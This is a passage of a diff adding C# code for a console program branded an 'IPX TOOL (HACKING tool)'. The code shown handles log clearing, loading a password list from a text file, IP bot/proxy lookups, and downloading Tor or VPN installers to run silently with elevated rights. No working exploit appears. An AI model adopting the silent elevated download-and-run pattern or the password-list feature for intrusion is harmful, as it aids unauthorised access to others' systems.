+                        Console.WriteLine("ip or person "); string option = Console.ReadLine();
+
+                        if (option.ToLower() == "ip")
+                        {
+                            Console.WriteLine("are u sure y/n");
+                            if (Console.ReadLine().ToLower() == "y")
+                            {
+                                File.WriteAllText(Ipslogpath, string.Empty);
+                                Console.WriteLine($"logs deleted from {Ipslogpath}");
+                                Thread.Sleep(500);
+                                displaymain();
+                            }
+
+
+                        }
+                        else if (option.ToLower() == "person")
+                        {
+                            Console.WriteLine("are u sure y/n");
+                            if (Console.ReadLine().ToLower() == "y")
+                            {
+                                File.WriteAllText(personlogpath, string.Empty);
+                                Console.WriteLine($"logs deleted from {personlogpath}");
+                                Thread.Sleep(500);
+                                displaymain();
+                            }
+
+                        }
+
+                    }
+                    else if (LogOption == "3")
+                    {
+                        Console.Clear();
+                        Console.WriteLine("Drag the .txt file into this console:");
+
+
+                        string filePath = Console.ReadLine();
+
+
+                        if (File.Exists(filePath))
+                        {
+
+
+
+                            List<string> passwords = new List<string>();
+
+                            try
+                            {
+
+                                string fileContent = File.ReadAllText(filePath);
+
+
+                                pasword = fileContent.Split(new[] { ',' }, StringSplitOptions.RemoveEmptyEntries);
+
+
+                                for (int i = 0; i < pasword.Length; i++)
+                                {
+                                    pasword[i] = pasword[i].Trim();
+                                }
+
+
+                                Console.WriteLine("Array of passwords:");
+                                foreach (var password in pasword)
+                                {
+                                    Console.WriteLine(password);
+                                }
+                            }
+                            catch (Exception ex)
+                            {
+                                Console.WriteLine($"Error: {ex.Message}");
+                            }
+                            Thread.Sleep(1000);
+                            displaymain();
+
+                        }
+                        else
+                        {
+                            Console.WriteLine("The specified file does not exist.");
+                        }
+                    }
+                    else
+                    {
+                        Console.WriteLine("Wrong option");
+                        Thread.Sleep(500);
+                        displaymain();
+                    }
+                }
+             else
+             {
+                    Console.WriteLine("Wrong option");
+                    Thread.Sleep(500);
+                    displaymain();
+             }
+            }
+        }
+
+
+        static void TorSoftware(string installerPath)
+        {
+            try
+            {
+                Console.WriteLine("Running the Tor Browser installer with silent mode...");
+
+                ProcessStartInfo processInfo = new ProcessStartInfo
+                {
+                    FileName = installerPath,
+                    Arguments = "/S",
+                    UseShellExecute = true,
+                    Verb = "runas",
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                };
+
+
+                Process installerProcess = Process.Start(processInfo);
+                installerProcess.WaitForExit();
+
+                Console.WriteLine("Installer launched successfully. Checking installation...");
+
+
+
+
+                torExecutablePath = null;
+
+
+                foreach (string path in TorPaths)
+                {
+                    if (File.Exists(path))
+                    {
+                        torExecutablePath = path;
+                        break;
+                    }
+                }
+
+                if (torExecutablePath == null)
+                {
+                    Console.WriteLine("Tor Browser executable not found");
+                    Console.WriteLine("full path to the Tor Browser exe:");
+                    torExecutablePath = Console.ReadLine();
+                }
+
+                if (File.Exists(torExecutablePath))
+                {
+                    Console.WriteLine("Launching Tor Browser...");
+
+                    ProcessStartInfo torProcessInfo = new ProcessStartInfo
+                    {
+                        FileName = torExecutablePath,
+                        UseShellExecute = true,
+                        CreateNoWindow = false,
+                        WindowStyle = ProcessWindowStyle.Normal
+                    };
+
+                    Process.Start(torProcessInfo);
+                }
+                else
+                {
+                    Console.WriteLine("Tor Browser executable not found. Please check the path and try again.");
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error launching installer or Tor Browser: {ex.Message}");
+            }
+        }
+
+        static async Task<string> CheckIfBot(string ipAddress)
+        {
+            string url = $"http://ip-api.com/json/{ipAddress}?fields=proxy,hosting,bots";
+
+            using (HttpClient client = new HttpClient())
+            {
+                String RTN;
+                try
+                {
+                    string response = await client.GetStringAsync(url);
+                    var ipData = JsonConvert.DeserializeObject<IpApiResponse>(response);
+
+                    Console.Clear();
+
+
+                    if (ipData.Proxy || ipData.Hosting || ipData.Bots == "yes")
+                    {
+
+                        RTN = "This IP is likely a bot or proxy.";
+
+                    }
+                    else
+                    {
+                        RTN = "This IP seems to belong to a real person.";
+
+                    }
+
+                }
+                catch (Exception ex)
+                {
+                    RTN = "Oh no a error: " + ex.Message;
+                }
+                return RTN;
+            }
+
+
+
+
+
+
+        }
+        static void displaymain()
+        {
+            string usersip = Dns.GetHostEntry(Dns.GetHostName()).AddressList[2].ToString();
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.Clear();
+            Console.WriteLine($@"
+╔════════════════════════════════════════════════════════════════╗
+║    ███████╗██████╗ ██╗  ██╗███████╗███████╗████████╗███████╗   ║
+║    ██╔════╝██╔══██╗██║  ██║██╔════╝██╔════╝╚══██╔══╝██╔════╝   ║
+║    █████╗  ██████╔╝███████║███████╗███████╗   ██║   █████╗     ║
+║    ██╔══╝  ██╔══██╗██╔══██║╚════██║╚════██║   ██║   ██╔══╝     ║
+║    ███████╗██║  ██║██║  ██║███████║███████║   ██║   ███████╗   ║         
+╠════════════════════════════════════════════════════════════════╣
+║  by: Axle   IPX TOOL (HACKING tool)    User ip:{usersip}   ║
+╠════════════════════════════════════════════════════════════════╣
+║ 1) Osint                                                       ║
+║ 2) Web                                                         ║
+║ 3) Network                                                     ║
+║ 4) Run darkweb/deepweb                                         ║
+║ 5) Protect ur self:)                                           ║
+║ 6) log settings                                                ║
+╠════════════════════════════════════════════════════════════════╣
+");
+
+            Console.ResetColor();
+        }
+        static void savelog(string save, string path, bool ipdir)
+        {
+            try
+            {
+
+                if (!System.IO.Directory.Exists(projectpath))
+                {
+
+                    Console.WriteLine("directory dosent exist");
+                    System.IO.Directory.CreateDirectory(projectpath);
+                    Thread.Sleep(1000);
+                }
+                else
+                {
+                    if (ipdir == true)
+                    {
+                        using (StreamWriter writer = new StreamWriter(path, append: true))
+                        {
+                            writer.WriteLine(save);
+                        }
+
+                        Console.WriteLine($"Log saved to {path}");
+                        Thread.Sleep(500);
+                    }
+                    else
+                    {
+                        using (StreamWriter writer = new StreamWriter(path, append: true))
+                        {
+                            writer.WriteLine(save);
+                        }
+
+                        Console.WriteLine($"Log saved to {path}");
+                    }
+
+                }
+                displaymain();
+
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"An error occurred: {ex.Message}");
+                Thread.Sleep(1000);
+                displaymain();
+            }
+        }
+        private static async Task<bool> TorInstaller(string downloadUrl, string installerPath)
+        {
+            try
+            {
+                Console.WriteLine("Downloading Tor Browser...");
+
+                using (HttpClient client = new HttpClient())
+                {
+                    client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
+
+
+                    HttpResponseMessage response = await client.GetAsync(downloadUrl);
+
+                    if (!response.IsSuccessStatusCode)
+                    {
+                        Console.WriteLine($"Error downloading installer. Status Code: {response.StatusCode}. Please check the URL.");
+                        return false;
+                    }
+
+                    byte[] data = await response.Content.ReadAsByteArrayAsync();
+
+                    System.IO.Directory.CreateDirectory(Path.GetDirectoryName(installerPath));
+                    await Task.Run(() => File.WriteAllBytes(installerPath, data));
+
+                    Console.WriteLine($"Download complete. Installer saved to: {installerPath}");
+                    return true;
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Unexpected error: {ex.Message}");
+                return false;
+            }
+        }
+        private static async Task<bool> VPNInstall(string downloadUrl, string installerPath)
+        {
+            try
+            {
+                Console.WriteLine("Downloading Vpn....");
+                using (HttpClient client = new HttpClient())
+                {
+                    client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");
+
+                    HttpResponseMessage response = await client.GetAsync(downloadUrl);
+
+                    if (!response.IsSuccessStatusCode)
+                    {
+                        Console.WriteLine($"Error downloading installer. Status Code: {response.StatusCode}. Please check the URL.");
+                        return false;
+                    }
+
+                    byte[] data = await response.Content.ReadAsByteArrayAsync();
+
+                    System.IO.Directory.CreateDirectory(Path.GetDirectoryName(installerPath));
+                    await Task.Run(() => File.WriteAllBytes(installerPath, data));
+
+                    Console.WriteLine($"Download complete. Installer saved to: {installerPath}");
+                    return true;
+
+                    
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Unexpected error: {ex.Message}");
+                return false;
+            }
+        }
+        static void VPNSoftware(string installerPath)
+        {
+            try
+            {
+                Console.WriteLine("Running the VPN installer with silent mode...");
+
+                ProcessStartInfo processInfo = new ProcessStartInfo
+                {
+                    FileName = installerPath,
+                    Arguments = "/S",
+                    UseShellExecute = true,
+                    Verb = "runas",
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                };
+
+
+                Process installerProcess = Process.Start(processInfo);
+                installerProcess.WaitForExit();
+
+                Console.WriteLine("Installer launched successfully. Checking installation...");
+
+
+
+
+                vpnexefile = null;
+
+
+                foreach (string path in VPNPaths)
+                {
+                    if (File.Exists(path))
+                    {
+                        vpnexefile = path;
+                        break;
+                    }
+                }
+
+                if (vpnexefile == null)
+                {
+                    Console.WriteLine("VPN executable not found");
+                    Console.WriteLine("full path to the VPN.exe:");
+                    vpnexefile = Console.ReadLine();
+                }
+
+                if (File.Exists(vpnexefile))
+                {
+                    Console.WriteLine("Launching VPN...");
+
+                    ProcessStartInfo torProcessInfo = new ProcessStartInfo
+                    {
+                        FileName = vpnexefile,
+                        UseShellExecute = true,
+                        CreateNoWindow = false,
+                        WindowStyle = ProcessWindowStyle.Normal
+                    };
+
+                    Process.Start(torProcessInfo);
+                }
+                else
+                {
+                    Console.WriteLine("VPN executable not found. Please check the path and try again.");
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error launching installer or VPN: {ex.Message}");
+            }
+        }
+    }
+    public class IpInfo
+    {
+        public string Ip { get; set; }
+        public string City { get; set; }
+        public string Region { get; set; }
+        public string Country { get; set; }
+        public string Loc { get; set; }
+        public string Org { get; set; }
+    }
+
+
+    public class IpApiResponse
+    {
+        public string Query { get; set; }
+        public bool Proxy { get; set; }
+        public bool Hosting { get; set; }
+        public string Bots { get; set; }
+    }
+}
